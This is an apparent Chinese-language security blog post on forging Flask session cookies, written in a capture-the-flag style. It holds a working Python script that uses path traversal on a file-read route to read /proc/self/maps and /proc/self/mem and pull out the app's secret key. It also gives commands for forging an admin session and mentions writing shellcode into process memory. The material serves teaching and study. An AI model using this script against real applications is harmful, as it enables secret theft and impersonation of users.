@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+
+
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+  <meta name="author" content="Hehanzzz">
+
+
+  <meta name="subtitle" content="“冬将尽，春可期”">
+
+
+  <meta name="description" content="Hehanzzz">
+
+
+
+<title>PyhonSession伪造 | Hehanzzz’s Blog</title>
+
+
+
+<link rel="icon" href="/favicon.ico">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/nprogress/nprogress.css">
+
+
+
+<script src="/lib/jquery.min.js"></script>
+
+
+<script src="/lib/iconify-icon.min.js"></script>
+
+
+<script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+<script>
+  tailwind.config = {
+    darkMode: "class",
+  };
+</script>
+
+
+<script src="/lib/nprogress/nprogress.js"></script>
+
+<script>
+  $(document).ready(() => {
+    NProgress.configure({
+      showSpinner: false,
+    });
+    NProgress.start();
+    $("#nprogress .bar").css({
+      background: "#de7441",
+    });
+    $("#nprogress .peg").css({
+      "box-shadow": "0 0 2px #de7441, 0 0 4px #de7441",
+    });
+    $("#nprogress .spinner-icon").css({
+      "border-top-color": "#de7441",
+      "border-left-color": "#de7441",
+    });
+    setTimeout(function () {
+      NProgress.done();
+      $(".fade").removeClass("out");
+    }, 800);
+  });
+</script>
+
+<script>
+  (function () {
+    const prefersDark =
+      window.matchMedia &&
+      window.matchMedia("(prefers-color-scheme: dark)").matches;
+    const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+    if (setting === "dark" || (prefersDark && setting !== "light"))
+      document.documentElement.classList.toggle("dark", true);
+    let isDark = document.documentElement.classList.contains("dark");
+  })();
+
+  $(document).ready(function () {
+    // init icon
+    const prefersDark =
+      window.matchMedia &&
+      window.matchMedia("(prefers-color-scheme: dark)").matches;
+    const isDark = document.documentElement.classList.contains("dark");
+    $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
+
+    function toggleGiscusTheme() {
+      const isDark = document.documentElement.classList.contains("dark");
+      const giscusFrame = document.querySelector("iframe.giscus-frame");
+      if (giscusFrame) {
+        giscusFrame.contentWindow.postMessage(
+          {
+            giscus: {
+              setConfig: {
+                theme: isDark ? "dark" : "light",
+              },
+            },
+          },
+          "https://giscus.app"
+        );
+      }
+    }
+
+
+    // toggle dark mode
+    function toggleDark() {
+      let isDark = document.documentElement.classList.contains("dark");
+      const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+      isDark = !isDark;
+      document.documentElement.classList.toggle("dark", isDark);
+      $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
+      if (prefersDark === isDark) {
+        localStorage.setItem("hexo-color-scheme", "auto");
+      } else {
+        localStorage.setItem("hexo-color-scheme", isDark ? "dark" : "light");
+      }
+      toggleGiscusTheme();
+    }
+    $("#toggle-dark").click(toggleDark);
+
+    // listen dark mode change
+    window
+      .matchMedia("(prefers-color-scheme: dark)")
+      .addEventListener("change", (e) => {
+        const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+        if (setting === "auto") {
+          document.documentElement.classList.toggle("dark", e.matches);
+          $("#theme-icon").attr(
+            "icon",
+            e.matches ? "ri:moon-line" : "ri:sun-line"
+          );
+          toggleGiscusTheme();
+        }
+      });
+  });
+</script>
+
+
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body class="font-sans bg-white dark:bg-zinc-900 text-gray-700 dark:text-gray-200 relative">
+  <header class="fixed w-full px-5 py-1 z-10 backdrop-blur-xl backdrop-saturate-150 border-b border-black/5">
+  <div class="max-auto">
+    <nav class="flex items-center text-base">
+      <a href="/" class="group">
+        <h2 class="font-medium tracking-tighterp text-l p-2">
+          <img class="w-5 mr-2 inline-block transition-transform group-hover:rotate-[30deg]" id="logo" src="/images/logo.svg" alt="Hehanzzz’s Blog" />
+          Hehanzzz’s Blog
+        </h2>
+      </a>
+      <div id="header-title" class="opacity-0 md:ml-2 md:mt-[0.1rem] text-xs font-medium whitespace-nowrap overflow-hidden overflow-ellipsis">
+        PyhonSession伪造
+      </div>
+      <div class="flex-1"></div>
+      <div class="flex items-center gap-3">
+        
+          <a class="hidden sm:flex" href="/archives">Posts</a>
+        
+        
+          
+            <a class="w-5 h-5 hidden sm:flex" title="Github" target="_blank" rel="noopener" href="https://github.com/hehanzzz">
+              <iconify-icon width="20" icon="ri:github-line"></iconify-icon>
+            </a>
+          
+            <a class="w-5 h-5 hidden sm:flex" title="Twitter" target="_blank" rel="noopener" href="https://x.com/hehanzzz">
+              <iconify-icon width="20" icon="ri:twitter-line"></iconify-icon>
+            </a>
+          
+        
+        <a class="w-5 h-5 hidden sm:flex" title="友情链接" href="2023/12/31/About-me-关于我/">
+          <iconify-icon width="20" icon="ri:rss-line"></iconify-icon>
+        </a>
+        <a class="w-5 h-5" title="toggle theme" id="toggle-dark">
+          <iconify-icon width="20" icon="" id="theme-icon"></iconify-icon>
+        </a>
+      </div>
+      <div class="flex items-center justify-center gap-3 ml-3 sm:hidden">
+        <span class="w-5 h-5" aria-hidden="true" role="img" id="open-menu">
+          <iconify-icon width="20" icon="carbon:menu" ></iconify-icon>
+        </span>
+        <span class="w-5 h-5 hidden" aria-hidden="true" role="img" id="close-menu">
+          <iconify-icon  width="20" icon="carbon:close" ></iconify-icon>
+        </span>
+      </div>
+    </nav>
+  </div>
+</header>
+<div id="menu-panel" class="h-0 overflow-hidden sm:hidden fixed left-0 right-0 top-12 bottom-0 z-10">
+  <div id="menu-content" class="relative z-20 bg-white/80 px-6 sm:px-8 py-2 backdrop-blur-xl -translate-y-full transition-transform duration-300">
+    <ul class="nav flex flex-col sm:flex-row text-sm font-medium">
+      
+        <li class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main">
+          <a href="/archives" class="flex h-12 sm:h-auto items-center">Posts</a>
+        </li>
+      
+    </ul>
+  </div>
+  <div class="mask bg-black/20 absolute inset-0"></div>
+</div>
+
+  <main class="pt-14">
+    <!-- css -->
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.min.css">
+
+
+<link rel="stylesheet" href="/lib/tocbot/tocbot.min.css">
+
+<!-- toc -->
+
+  <!-- tocbot -->
+<nav class="post-toc toc text-sm w-48 relative top-32 right-0 opacity-70 hidden lg:block" style="position: fixed !important;"></nav>
+
+
+<section class="px-6 max-w-prose mx-auto md:px-0">
+  <!-- header -->
+  <header class="overflow-hidden pt-6 pb-6 md:pt-12">
+    <div class="pt-4 md:pt-6">
+      <h1 id="article-title" class="text-[2rem] font-bold leading-snug mb-4 md:mb-6 md:text-[2.6rem]">
+        PyhonSession伪造
+      </h1>
+      <div>
+        <section class="flex items-center gap-3 text-sm">
+          <span class="flex items-center gap-1">
+            <iconify-icon width="18" icon="carbon-calendar" ></iconify-icon>
+            <time>2023-12-30</time>
+          </span>
+          <span class="text-gray-400">·</span>
+          <span class="flex items-center gap-1">
+            <iconify-icon width="18" icon="ic:round-access-alarm" ></iconify-icon>
+            <span>6 min</span>
+          </span>
+          <span class="text-gray-400">·</span>
+          <span class="flex items-center gap-1">
+            <iconify-icon width="18" icon="icon-park-outline:font-search" ></iconify-icon>
+            <span>1.3k words</span>
+          </span>
+          
+        </section>
+      </div>
+    </div>
+  </header>
+  <!-- content -->
+  <article class="post-content prose m-auto slide-enter-content dark:prose-invert">
+    <p>Python Session伪造类题目</p>
+<span id="more"></span>
+
+<h1 id="0x01-Session说明"><a href="#0x01-Session说明" class="headerlink" title="0x01 Session说明"></a>0x01 Session说明</h1><p>在python的Flask中Session是塞在Cookie里返回给客户端的，如果我们恶意生成一个session对身份伪造就可以达到欺骗服务器的目的</p>
+<h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&quot;aaabbbccc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        name = session[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">&quot;Hehansen&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;欢迎Hehansen&quot;</span></span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;欢迎admin&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;你是谁&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>]=<span class="string">&quot;Hehansen&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;session重新设置&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/pythonsession/image.png"></p>
+<p>Session的值是json格式的Base64编码（eyJuYW1lIjoiYWRtaW4ifQ.ZQLhcg.ItJwvsUVS9fmbh5gm_XcAsTj220）</p>
+<h3 id="session安全问题："><a href="#session安全问题：" class="headerlink" title="session安全问题："></a>session安全问题：</h3><p>flask框架的session是存储在客户端的，那么就需要解决session是否会被恶意纂改的问题，而flask通过一个secret_key，也就是密钥对数 据进行签名来防止session被纂改，在我上面写的例子就定义有密钥。 </p>
+<p>app.secret_key &#x3D; “aaabbbccc”</p>
+<p>正常情况下这个密钥是不会给你看的。但是光有数据签名，安全性还是不够的，session没有做任何加密处理，是用户可见的，可以得到修改session里的内容，如果我们还得到了用于签名的密钥，那么攻击者就可以进行session伪造。</p>
+<h1 id="0x03-密钥寻找"><a href="#0x03-密钥寻找" class="headerlink" title="0x03 密钥寻找"></a>0x03 密钥寻找</h1><ol>
+<li>app.py文件</li>
+<li>config.py文件</li>
+<li>有关文件读取的代码： linux 提供了&#x2F;proc&#x2F;self&#x2F;目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于&#x2F;proc&#x2F; 本进程 pid&#x2F;，&#x2F;proc&#x2F;self&#x2F;environ是此文件包含设置的初始环境，换句话说就是该进程的环境变量</li>
+<li>可以利用python存储对象的位置在堆上这个特性，app是实例化的Flask对象，而secret key在app.config[‘SECRET_KEY’]，所以可以通过读 取&#x2F;proc&#x2F;self&#x2F;mem来读取secret key</li>
+</ol>
+<h3 id="堆栈分析："><a href="#堆栈分析：" class="headerlink" title="堆栈分析："></a>堆栈分析：</h3><ul>
+<li><p>读取&#x2F;proc&#x2F;self&#x2F;maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。</p>
+</li>
+<li><p>&#x2F;proc&#x2F;self&#x2F;mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。网上一些介绍说该文件不可读，乍一看确实是这 样？</p>
+</li>
+<li><p>正确的姿势是结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取 内存内容。</p>
+</li>
+<li><p>同样的，我们也可以通过写入mem文件来直接写入内存，例如直接修改代码段，放入我们的shellcode，从而在程序流程执行到这一步 时执行shellcode来拿shell。</p>
+</li>
+</ul>
+<h3 id="读取堆栈分布："><a href="#读取堆栈分布：" class="headerlink" title="读取堆栈分布："></a>读取堆栈分布：</h3><p>通过app.py文件我们已知密钥的形式，存储的对象在app.config上，所以可以通过&#x2F;proc&#x2F;self&#x2F;mem读取：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;*abcdefgh&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于&#x2F;proc&#x2F;self&#x2F;mem内容较多而且存在不可读写部分，直接读取会导致程序崩溃，所以先读取&#x2F;proc&#x2F;self&#x2F;maps获取堆栈分布</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">map_list = requests.get(url + <span class="string">f&quot;info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/maps&quot;</span>)</span><br><span class="line">map_list = map_list.text.split(<span class="string">&quot;\\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> map_list:</span><br><span class="line">	map_addr = re.<span class="keyword">match</span>(<span class="string">r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;</span>, i)</span><br><span class="line">	<span class="keyword">if</span> map_addr:</span><br><span class="line">		start = <span class="built_in">int</span>(map_addr.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">		end = <span class="built_in">int</span>(map_addr.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Found rw addr:&quot;</span>, start, <span class="string">&quot;-&quot;</span>, end)</span><br></pre></td></tr></table></figure>
+
+<h3 id="读取对应位置内存数据："><a href="#读取对应位置内存数据：" class="headerlink" title="读取对应位置内存数据："></a>读取对应位置内存数据：</h3><p>然后读取&#x2F;proc&#x2F;self&#x2F;mem，读取对应位置的内存数据，再使用正则表达式查找内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">res = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/mem&amp;start=<span class="subst">&#123;start&#125;</span>&amp;end=<span class="subst">&#123;end&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;*abcdefgh&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">	secret_key = re.findall(<span class="string">&quot;[a-z0-9]&#123;32&#125;\*abcdefgh&quot;</span>, res.text)</span><br><span class="line">	<span class="keyword">if</span> secret_key:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Secret Key:&quot;</span>, secret_key[<span class="number">0</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="合并读取密钥"><a href="#合并读取密钥" class="headerlink" title="合并读取密钥:"></a>合并读取密钥:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span></span><br><span class="line">s_key = <span class="string">&quot;&quot;</span></span><br><span class="line">bypass = <span class="string">&quot;../..&quot;</span></span><br><span class="line"><span class="comment"># 请求file路由进行读取</span></span><br><span class="line">map_list = requests.get(url + <span class="string">f&quot;info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/maps&quot;</span>)</span><br><span class="line">map_list = map_list.text.split(<span class="string">&quot;\\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> map_list:</span><br><span class="line">	<span class="comment"># 匹配指定格式的地址</span></span><br><span class="line">	map_addr = re.<span class="keyword">match</span>(<span class="string">r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;</span>, i)</span><br><span class="line">	<span class="keyword">if</span> map_addr:</span><br><span class="line">		start = <span class="built_in">int</span>(map_addr.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">		end = <span class="built_in">int</span>(map_addr.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Found rw addr:&quot;</span>, start, <span class="string">&quot;-&quot;</span>, end)</span><br><span class="line"></span><br><span class="line">		<span class="comment"># 设置起始和结束位置并读取/proc/self/mem</span></span><br><span class="line">		res = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/mem&amp;start=<span class="subst">&#123;start&#125;</span>&amp;end=<span class="subst">&#123;end&#125;</span>&quot;</span>)</span><br><span class="line">		<span class="comment"># 如果发现*abcdefgh存在其中，说明成功泄露secretkey</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;*abcdefgh&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">			<span class="comment"># 正则匹配，本题secret key格式为32个小写字母或数字，再加上*abcdefgh</span></span><br><span class="line">			secret_key = re.findall(<span class="string">&quot;[a-z0-9]&#123;32&#125;\*abcdefgh&quot;</span>, res.text)</span><br><span class="line">			<span class="keyword">if</span> secret_key:</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">&quot;Secret Key:&quot;</span>, secret_key[<span class="number">0</span>])</span><br><span class="line">				s_key = secret_key[<span class="number">0</span>]</span><br><span class="line">				<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="伪造脚本使用："><a href="#伪造脚本使用：" class="headerlink" title="伪造脚本使用："></a>伪造脚本使用：</h3><p>脚本链接：<a target="_blank" rel="noopener" href="https://gitcode.net/mirrors/noraj/flask-session-cookie-manager?utm_source=csdn_github_accelerator">https://gitcode.net/mirrors/noraj/flask-session-cookie-manager?utm_source&#x3D;csdn_github_accelerator</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">解密:python flask_session_manager.py decode -c -s</span><br><span class="line"><span class="comment">#-c是flask cookie里的session值 -s参数是SECRET_KEY</span></span><br><span class="line">python3 flask_session_cookie_manager3.py decode -s <span class="string">&quot;aaabbbccc&quot;</span> -c <span class="string">&quot;eyJuYW1lIjoiSGVoYW5zZW4ifQ.ZQK9lA.YiwR4DWCuUuWanDhXul2O8l83I4&quot;</span></span><br><span class="line"><span class="comment">#&#123;&#x27;name&#x27;: &#x27;Hehansen&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line">加密:python flask_session_manager.py encode -s -t</span><br><span class="line"><span class="comment">#-s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式</span></span><br><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&quot;aaabbbccc&quot;</span> -t <span class="string">&quot;&#123;&#x27;name&#x27;: &#x27;admin&#x27;&#125;&quot;</span></span><br><span class="line"><span class="comment">#eyJuYW1lIjoiYWRtaW4ifQ.ZQLhcg.ItJwvsUVS9fmbh5gm_XcAsTj220</span></span><br></pre></td></tr></table></figure>
+
+<p>如果运行脚本时候出现</p>
+<p><code>ImportError: cannot import name &#39;Markup&#39; from &#39;jinja2&#39; (G:\Anaconda\lib\site-packages\jinja2__init__.py)</code>​</p>
+<ol>
+<li>pip uninstall  Flask Jinja2</li>
+<li>pip install Flask Jinja2</li>
+</ol>
+<p>‍</p>
+
+  </article>
+  <!-- tag -->
+  <div class="mt-12 pt-6 border-t border-gray-200">
+    
+      
+        <span class="bg-gray-100 dark:bg-gray-700 px-2 py-1 m-1 text-sm rounded-md transition-colors hover:bg-gray-200">
+          <a href="/tags/Python/">Python</a>
+        </span>
+      
+        <span class="bg-gray-100 dark:bg-gray-700 px-2 py-1 m-1 text-sm rounded-md transition-colors hover:bg-gray-200">
+          <a href="/tags/session%E4%BC%AA%E9%80%A0/">session伪造</a>
+        </span>
+      
+    
+  </div>
+  <!-- prev and next -->
+  <div class="flex justify-between mt-12 pt-6 border-t border-gray-200">
+    <div>
+      
+        <a href="/2023/12/20/PyhonSSTI/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
+          <iconify-icon width="20" icon="ri:arrow-left-s-line" data-inline="false"></iconify-icon>
+          PyhonSSTI模板注入
+        </a>
+      
+    </div>
+    <div>
+      
+        <a href="/2023/12/20/PythonPin%E7%A0%81/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
+          PythonPin码
+          <iconify-icon width="20" icon="ri:arrow-right-s-line" data-inline="false"></iconify-icon>
+        </a>
+      
+    </div>
+  </div>
+  <!-- comment -->
+  <div class="article-comments mt-12">
+    
+<script
+  src="https://giscus.app/client.js"
+  data-repo="Hehanzzz/hehanzzz.github.io"
+  data-repo-id="R_kgDOKls9Wg"
+  data-category="Announcements"
+  data-category-id="DIC_kwDOKls9Ws4Cb8Mv"
+  data-mapping="pathname"
+  data-strict="0"
+  data-reactions-enabled="1"
+  data-emit-metadata="0"
+  data-input-position="bottom"
+  data-theme="preferred_color_scheme"
+  data-lang="zh-CN"
+  crossorigin="anonymous"
+  async
+></script>
+<script>
+  window.onload = function () {
+    console.log("giscus loaded");
+    const isDark = document.documentElement.classList.contains("dark");
+    const giscusFrame = document.querySelector("iframe.giscus-frame");
+    giscusFrame.contentWindow.postMessage(
+      {
+        giscus: {
+          setConfig: {
+            theme: isDark ? "dark" : "light",
+          },
+        },
+      },
+      "https://giscus.app"
+    );
+  };
+</script>
+
+
+  </div>
+</section>
+<!-- js inspect -->
+
+<script src="/lib/clipboard.min.js"></script>
+
+
+<script async src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+<script>
+  $(document).ready(() => {
+    const maraidConfig = {
+      theme: "default",
+      logLevel: 3,
+      flowchart: { curve: "linear" },
+      gantt: { axisFormat: "%m/%d/%Y" },
+      sequence: { actorMargin: 50 },
+    };
+    mermaid.initialize(maraidConfig);
+  });
+</script>
+
+
+
+<script src="/lib/fancybox/fancybox.umd.min.js"></script>
+
+<script>
+  $(document).ready(() => {
+    $('.post-content').each(function(i){
+      $(this).find('img').each(function(){
+        if ($(this).parent().hasClass('fancybox') || $(this).parent().is('a')) return;
+        var alt = this.alt;
+        if (alt) $(this).after('<span class="fancybox-alt">' + alt + '</span>');
+        $(this).wrap('<a class="fancybox-img" href="' + this.src + '" data-fancybox=\"gallery\" data-caption="' + alt + '"></a>')
+      });
+      $(this).find('.fancybox').each(function(){
+        $(this).attr('rel', 'article' + i);
+      });
+    });
+
+    Fancybox.bind('[data-fancybox="gallery"]', {
+        // options
+    })
+  })
+</script>
+
+<!-- tocbot begin -->
+
+<script src="/lib/tocbot/tocbot.min.js"></script>
+
+<script>
+  $(document).ready(() => {
+      tocbot.init({
+        // Where to render the table of contents.
+        tocSelector: '.post-toc',
+        // Where to grab the headings to build the table of contents.
+        contentSelector: '.post-content',
+        // Which headings to grab inside of the contentSelector element.
+        headingSelector: 'h1, h2, h3',
+        // For headings inside relative or absolute positioned containers within content.
+        hasInnerContainers: true,
+    });
+  })
+</script>
+<!-- tocbot end -->
+
+
+  </main>
+  <footer class="flex flex-col h-40 items-center justify-center text-gray-400 text-sm">
+  <!-- busuanzi -->
+  
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- Busuanzi Analytics -->
+<div class="flex items-center gap-2">
+  <span>Visitors</span>
+  <span id="busuanzi_value_site_uv"></span>
+  <span>Page Views</span>
+  <span id="busuanzi_value_site_pv"></span>
+</div>
+<!-- End Busuanzi Analytics -->
+
+
+  <!-- copyright -->
+  <div class="flex items-center gap-2">
+    <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" style="color: inherit;">CC BY-NC-SA 4.0</a>
+    <span>© 2023</span>
+    <iconify-icon width="18" icon="emojione-monotone:maple-leaf" ></iconify-icon>
+    <a href="https://github.com/hehanzzz" target="_blank" rel="noopener noreferrer">Hehanzzz</a>
+  </div>
+  <!-- powered by -->
+  <div class="flex items-center gap-2">
+    <span>Powered by</span>
+    <a href="https://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a>
+    <span>&</span>
+    <a href="https://github.com/hehanzzz" target="_blank" rel="noopener noreferrer">Maple</a>
+  </div>
+
+</footer>
+
+  <div class="back-to-top box-border fixed right-6 z-1024 -bottom-20 rounded py-1 px-1 bg-slate-900 opacity-60 text-white cursor-pointer text-center dark:bg-slate-600">
+    <span class="flex justify-center items-center text-sm">
+      <iconify-icon width="18" icon="ion:arrow-up-c" id="go-top"></iconify-icon>
+      <span id="scrollpercent"><span>0</span> %</span>
+    </span>
+  </div>
+  
+<script src="/js/main.js"></script>
+
+
+  <script>
+    $(document).ready(function () {
+      const mapleCount = "10";
+      const speed = "0.5";
+      const mapleEl = document.getElementById("maple");
+      const maples = Array.from({ length: mapleCount }).map(() => {
+        const maple = document.createElement("div");
+        const scale = Math.random() * 0.5 + 0.5;
+        const offset = Math.random() * 2 - 1;
+        const x = Math.random() * mapleEl.clientWidth;
+        const y = -Math.random() * mapleEl.clientHeight;
+        const duration = 10 / speed;
+        const delay = -duration;
+        maple.className = "maple";
+        maple.style.width = `${24 * scale}px`;
+        maple.style.height = `${24 * scale}px`;
+        maple.style.left = `${x}px`;
+        maple.style.top = `${y}px`;
+        maple.style.setProperty("--maple-fall-offset", offset);
+        maple.style.setProperty("--maple-fall-height", `${Math.abs(y) + mapleEl.clientHeight}px`);
+        maple.style.animation = `fall ${duration}s linear infinite`;
+        maple.style.animationDelay = `${delay}s`;
+        mapleEl.appendChild(maple)
+        return maple
+      })
+    });
+  </script>
+  
+
+
+  <div class="fixed top-0 bottom-0 left-0 right-0 pointer-events-none print:hidden" id="maple"></div>
+</body>
+
+</html>
